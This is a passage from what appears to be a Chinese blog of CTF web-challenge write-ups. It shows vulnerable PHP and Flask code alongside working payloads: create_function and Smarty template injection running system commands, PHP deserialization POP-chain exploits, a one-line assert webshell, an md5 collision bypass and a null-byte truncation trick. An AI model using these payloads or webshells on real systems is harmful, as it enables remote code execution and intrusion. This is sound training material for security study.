<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//sorry , here is true last level</span></span><br><span class="line"><span class="comment">//^_^</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;str.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>create_function注入，payload：<code>a=\create_function&amp;b=&#125;system(&#39;cat /flag&#39;);//</code></p>
<h1 id="43-HUBUCTF-2022-新生赛-checkin"><a href="#43-HUBUCTF-2022-新生赛-checkin" class="headerlink" title="43.[HUBUCTF 2022 新生赛]checkin"></a>43.[HUBUCTF 2022 新生赛]checkin</h1><p>弱比较，php array的形式还有序列化</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span>=&gt;<span class="number">0</span>,<span class="string">&quot;password&quot;</span>=&gt;<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//a:2:&#123;s:8:&quot;username&quot;;i:0;s:8:&quot;password&quot;;i:0;&#125;</span></span><br><span class="line"><span class="comment">//payload：?info=a:2:&#123;s:8:&quot;username&quot;;i:0;s:8:&quot;password&quot;;i:0;&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="44-CISCN-2019华东南-Web11"><a href="#44-CISCN-2019华东南-Web11" class="headerlink" title="44.[CISCN 2019华东南]Web11"></a>44.[CISCN 2019华东南]Web11</h1><p>smarty ssti</p>
<p>xff处payload：<code>&#123;if system(&#39;cat /flag&#39;)&#125;&#123;/if&#125;</code>然后F12查看flag</p>
<h1 id="45-HDCTF-2023-Welcome-To-HDCTF-2023"><a href="#45-HDCTF-2023-Welcome-To-HDCTF-2023" class="headerlink" title="45.[HDCTF 2023]Welcome To HDCTF 2023"></a>45.[HDCTF 2023]Welcome To HDCTF 2023</h1><p>F12看到jsfuck直接复制控制台输出</p>
<h1 id="46-NISACTF-2022-babyupload"><a href="#46-NISACTF-2022-babyupload" class="headerlink" title="46.[NISACTF 2022]babyupload"></a>46.[NISACTF 2022]babyupload</h1><p>&#x2F;source下载源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;.&quot;</span> <span class="keyword">in</span> file.filename:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Bad filename!&quot;</span>, <span class="number">403</span></span><br><span class="line">    conn = db()</span><br><span class="line">    cur = conn.cursor()</span><br><span class="line">    uid = uuid.uuid4().<span class="built_in">hex</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cur.execute(<span class="string">&quot;insert into files (id, path) values (?, ?)&quot;</span>, (uid, file.filename,))</span><br><span class="line">    <span class="keyword">except</span> sqlite3.IntegrityError:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Duplicate file&quot;</span></span><br><span class="line">    conn.commit()</span><br><span class="line"></span><br><span class="line">    file.save(<span class="string">&#x27;uploads/&#x27;</span> + file.filename)</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&#x27;/file/&#x27;</span> + uid)</span><br></pre></td></tr></table></figure>

<p>上传文件时会将uid和文件名添加到数据库中，并重定向到该文件下，过滤了文件名带.的文件，只需要上传文件名为<code>/flag</code>的文件，抓包改文件名即可</p>
<h1 id="47-GDOUCTF-2023-hate-eat-snake"><a href="#47-GDOUCTF-2023-hate-eat-snake" class="headerlink" title="47.[GDOUCTF 2023]hate eat snake"></a>47.[GDOUCTF 2023]hate eat snake</h1><p>F12把snake.js里的971行修改成<code>if(this[&#39;getScore&#39;]() &gt; 1)</code></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable language_">this</span>[<span class="string">&#x27;getScore&#x27;</span>]() &gt; <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">alert</span>(<span class="title function_">_0x324fcb</span>(<span class="number">0x2d9</span>, <span class="number">0x2c3</span>, <span class="number">0x2db</span>, <span class="number">0x2f3</span>) + <span class="string">&#x27;k3r_h0pe_t&#x27;</span> + <span class="title function_">_0xe4a674</span>(<span class="number">0x5a1</span>, <span class="number">0x595</span>, <span class="number">0x59e</span>, <span class="number">0x57c</span>) + <span class="string">&#x27;irlfriend&#125;&#x27;</span>),</span><br></pre></td></tr></table></figure>

<p>然后开始游戏就弹flag</p>
<h1 id="48-NISACTF-2022-babyserialize"><a href="#48-NISACTF-2022-babyserialize" class="headerlink" title="48.[NISACTF 2022]babyserialize"></a>48.[NISACTF 2022]babyserialize</h1><p>php的魔术方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__invoke():当尝试以调用函数的方式调用对象的时候，就会调用该方法</span><br><span class="line">__construct():具有构造函数的类在创建新对象的时候，回调此方法</span><br><span class="line">__destruct():反序列化的时候，或者对象销毁的时候调用</span><br><span class="line">__wakeup():反序列化的时候调用</span><br><span class="line">__sleep():序列化的时候调用</span><br><span class="line">__toString():把类当成字符串的时候调用，一般在echo处生效</span><br><span class="line">__set():在给不可访问的(protected或者private)或者不存在的属性赋值的时候，会被调用</span><br><span class="line">__get():读取不可访问或者不存在的属性的时候，进行赋值</span><br><span class="line">__call():在对象中调用一个不可访问的方法的时候，会被执行</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;waf.php&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NISA</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fun</span>=<span class="string">&quot;show_me_flag&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$txw4ever</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;fun==<span class="string">&quot;show_me_flag&quot;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">hint</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$from</span>,<span class="variable">$val</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fun=<span class="variable">$val</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;fun;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">checkcheck</span>(<span class="variable">$this</span>-&gt;txw4ever);</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;txw4ever);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TianXiWei</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$x</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ext-&gt;<span class="title function_ invoke__">nisa</span>(<span class="variable">$this</span>-&gt;x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ilovetxw</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$huang</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$su</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$fun1</span>,<span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;huang-&gt;fun=<span class="variable">$arg</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$bb</span> = <span class="variable language_">$this</span>-&gt;su;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$bb</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">four</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&quot;TXW4EVER&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fun</span>=<span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span>=<span class="variable">$value</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;fun = <span class="string">&quot;sixsixsix&quot;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">strtolower</span>(<span class="variable">$this</span>-&gt;a);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ser&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ser&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//func checkcheck($data)&#123;</span></span><br><span class="line"><span class="comment">//  if(preg_match(......))&#123;</span></span><br><span class="line"><span class="comment">//      die(something wrong);</span></span><br><span class="line"><span class="comment">//  &#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//function hint()&#123;</span></span><br><span class="line"><span class="comment">//    echo &quot;.......&quot;;</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>eval→代码执行，eval在__invoke中，就去找$a();</p>
<p>Ilovetxw里有toString里面return $bb();</p>
<p>为了触发toString，要找一个把类当字符串处理的函数，在four类里面有一个strlower($this-&gt;a)，而这一行写在<code>__set</code>方法里，所以需要调用<code>__set</code>方法，就需要用到<code>__call</code>方法，最后就会用到<code>__wakeup()</code></p>
<p>用自己的话理解就是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">用最终结果反推的思路，我们需要执行@eval($this-&gt;txw4ever)这一行，并且控制$this-&gt;txw4ever的值为system(&#x27;ls /&#x27;)这样的命令执行payload，这里先按下不谈，我们需要执行@eval这一条，为了执行这一条，它在__invoke()方法里面，所以需要执行__invoke()方法，__invoke()尝试以调用函数的方式调用对象才会触发，就需要寻找$a();这样的语句，在Ilovetxw类的__toString()当中存在return $bb();这一句，而$bb=$this-&gt;su，所以需要让su为NISA对象，才能通过$bb();调用__invoke()。然后需要触发其中的__toString()方法，为了触发这个__toString()方法，需要找到将类当成字符串来处理的方法，常见的有echo，本题是strlower($this-&gt;a)，这里让$this-&gt;a为对象Ilovetxw就可以了，而为了执行strlower()，这个strlower()写在类four的__set方法里，所以需要调用__set方法，需要对不存在或者不可访问的变量进行赋值，就会自动调用，Ilovetxw的__call()方法里面，$this-&gt;huang-&gt;fun=$arg[0];，可以发现，Ilovetxw里并没有成员fun，所以能触发__set，为了触发__set，__set在four类里，那么可控制$this-&gt;huang为对象four。接着需要触发__call方法，__call对不存在的方法或者不可访问的方法进行调用就自动调用，类TianXiWei的__wakeup()里面有$this-&gt;ext-&gt;nisa($this-&gt;x);而nisa()并不存在，所以要设置ext的值为类Ilovetxw的对象，通过__call来触发Ilovetxw里的__set，这个__set又能执行strlower进而触发__toString，进而触发__invoke()，最终执行里面的@eval()</span><br><span class="line">写得清晰一点就从类和方法写链子</span><br><span class="line">__invoke()-&gt;__toString()-&gt;__set()-&gt;__call()-&gt;__wakeup()</span><br><span class="line">NISA()-&gt;Ilovetxw()-&gt;four()-&gt;Ilovetxw()-&gt;TianXiWei()</span><br></pre></td></tr></table></figure>

<p>exp：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NISA</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fun</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$txw4ever</span> =<span class="string">&#x27;system(&quot;ls /&quot;);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TianXiWei</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$x</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ilovetxw</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$huang</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$su</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">four</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fun</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">TianXiWei</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;ext = <span class="keyword">new</span> <span class="title class_">Ilovetxw</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;ext-&gt;huang = <span class="keyword">new</span> <span class="title function_ invoke__">four</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;ext-&gt;huang-&gt;a =<span class="keyword">new</span> <span class="title class_">Ilovetxw</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;ext-&gt;huang-&gt;a-&gt;su =<span class="keyword">new</span> <span class="title function_ invoke__">NISA</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));<span class="comment">//因为类里面有private或者protected成员，序列化后的字符串会存在特殊字符，需要通过url编码之后再传参</span></span><br><span class="line"><span class="comment">//最后考虑到waf，使用大小写进行绕过，system-&gt;System</span></span><br></pre></td></tr></table></figure>

<p>至此，想必对php的反序列化有了一个较为深刻的理解了。</p>
<h1 id="49-NISACTF-2022-midlevel"><a href="#49-NISACTF-2022-midlevel" class="headerlink" title="49.[NISACTF 2022]midlevel"></a>49.[NISACTF 2022]midlevel</h1><p>和CISCN2019华东南web11一样</p>
<h1 id="50-NSSCTF-2022-Spring-Recruit-babyphp"><a href="#50-NSSCTF-2022-Spring-Recruit-babyphp" class="headerlink" title="50.[NSSCTF 2022 Spring Recruit]babyphp"></a>50.[NSSCTF 2022 Spring Recruit]babyphp</h1><p>使用数组来绕过intval，会报错返回1，也能绕过正则后面的就是经典md5比较</p>
<p>payload：</p>
<p><code>POST a[]=1,2&amp;b1[]=1&amp;b2[]=2&amp;c1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;c2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</code></p>
<h1 id="51-NISACTF-2022-bingdundun"><a href="#51-NISACTF-2022-bingdundun" class="headerlink" title="51.[NISACTF 2022]bingdundun~"></a>51.[NISACTF 2022]bingdundun~</h1><p>文件上传，可以考虑phar或者zip协议，上传了zip之后</p>
<p><code>phar://xxx.zip/xxx</code>，由于xxx的内容是一句话，蚁剑连接该地址即可</p>
<h1 id="52-GDOUCTF-2023-EZ-WEB"><a href="#52-GDOUCTF-2023-EZ-WEB" class="headerlink" title="52.[GDOUCTF 2023]EZ WEB"></a>52.[GDOUCTF 2023]EZ WEB</h1><p>F12-&gt;&#x2F;src，阅读源码，postman用put方法访问&#x2F;super-secret-route-nobody-will-guess</p>
<h1 id="53-LitCTF-2023-Vim-yyds"><a href="#53-LitCTF-2023-Vim-yyds" class="headerlink" title="53.[LitCTF 2023]Vim yyds"></a>53.[LitCTF 2023]Vim yyds</h1><p>扫目录，以及积累：vim打开文件会生成临时的swp，&#x2F;.index.php.swp获取缓存，使用strings打开，获取代码逻辑</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="title function_ invoke__">system</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Oh You got my password!&lt;/p&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$password</span>)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;can can need Vim &lt;/p&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;Give_Me_Your_Flag&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>将password进行b64编码，传入，执行任意命令</p>
<h1 id="54-GXYCTF-2019-BabyUpload"><a href="#54-GXYCTF-2019-BabyUpload" class="headerlink" title="54.[GXYCTF 2019]BabyUpload"></a>54.[GXYCTF 2019]BabyUpload</h1><p>content-type修改，上传.htaccess，过滤&lt;?，使用script绕过</p>
<p><code>&lt;script language=&#39;php&#39;&gt;assert($_REQUEST[&#39;cmd&#39;])&lt;/script&gt;</code></p>
<p>waf不允许执行system()，使用show_source()</p>
<h1 id="55-GKCTF-2020-cve版签到"><a href="#55-GKCTF-2020-cve版签到" class="headerlink" title="55.[GKCTF 2020]cve版签到"></a>55.[GKCTF 2020]cve版签到</h1><p>点击页面的连接可以回显header，php的get_headers()函数在低版本被url的\0截断就可以请求连接。浏览器通过%00截断</p>
<p><code>?url=http://127.0.0.1%00www.ctfhub.com</code></p>
<p>回显的Tips里面有host以123结尾</p>
<p><code>?url=http://127.0.0.123%00www.ctfhub.com</code></p>
<h1 id="56-HNCTF-2022-Week1-2048"><a href="#56-HNCTF-2022-Week1-2048" class="headerlink" title="56.[HNCTF 2022 Week1]2048"></a>56.[HNCTF 2022 Week1]2048</h1><p>F12找到flag的ascii</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">plain = [<span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>,<span class="number">123</span>,<span class="number">53</span>,<span class="number">51</span>,<span class="number">49</span>,<span class="number">54</span>,<span class="number">48</span>,<span class="number">99</span>,<span class="number">56</span>,<span class="number">56</span>,<span class="number">56</span>,<span class="number">101</span>,<span class="number">50</span>,<span class="number">53</span>,<span class="number">99</span>,<span class="number">51</span>,<span class="number">102</span>,<span class="number">56</span>,<span class="number">50</span>,<span class="number">56</span>,<span class="number">98</span>,<span class="number">50</span>,<span class="number">51</span>,<span class="number">101</span>,<span class="number">51</span>,<span class="number">49</span>,<span class="number">54</span>,<span class="number">97</span>,<span class="number">55</span>,<span class="number">97</span>,<span class="number">101</span>,<span class="number">48</span>,<span class="number">56</span>,<span class="number">51</span>,<span class="number">125</span>]</span><br><span class="line">s = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> plain:</span><br><span class="line">    s+=<span class="built_in">chr</span>(i)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"><span class="comment">#flag&#123;53160c888e25c3f828b23e316a7ae083&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="57-LitCTF-2023-Http-pro-max-plus"><a href="#57-LitCTF-2023-Http-pro-max-plus" class="headerlink" title="57.[LitCTF 2023]Http pro max plus"></a>57.[LitCTF 2023]Http pro max plus</h1><p>Client-IP:127.0.0.1</p>
<p>Referer:pornhub.com</p>
<p>User-Agent:Chrome</p>
<p>Via:Clash.win</p>
<p>然后F12查看注释的flag地址最后访问</p>
<h1 id="58-NISACTF-2022-popchains"><a href="#58-NISACTF-2022-popchains" class="headerlink" title="58.[NISACTF 2022]popchains"></a>58.[NISACTF 2022]popchains</h1><p><code>分析下链子，传入wish进行反序列化，在Try_Work_Hard类里找到include($value)函数，需要include(/flag)，这是最终目的，为此需要调用append方法，而类里面有__invoke()方法会调用append，为此需要触发invoke，为了触发invoke，需要寻找$a()，在Make_a_Change类的__get方法里return了一个$function()，$a()就找到了。为此需要触发__get，而$function的值是$this-&gt;effort，可以控制它为对象，为了触发get，需要访问不存在的属性，而Road_is_Long里的__toString里面的return $this-&gt;string-&gt;page，可以控制string为其他类对象，其他类对象里面没有page这个属性，就可以触发__get，所以要触发__toString，而Road_is_Long的__construct里面的$this-&gt;page = $file;会触发__toString，就让$this-&gt;page的值为Road_is_Long的对象就可以了。尝试写个exp</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Road_is_Long</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$page</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Try_Work_Hard</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$var</span> = <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Make_a_Change</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$effort</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Road_is_Long</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;page = <span class="keyword">new</span> <span class="title class_">Road_is_Long</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;page-&gt;<span class="keyword">string</span> = <span class="keyword">new</span> <span class="title class_">Make_a_Change</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;page-&gt;<span 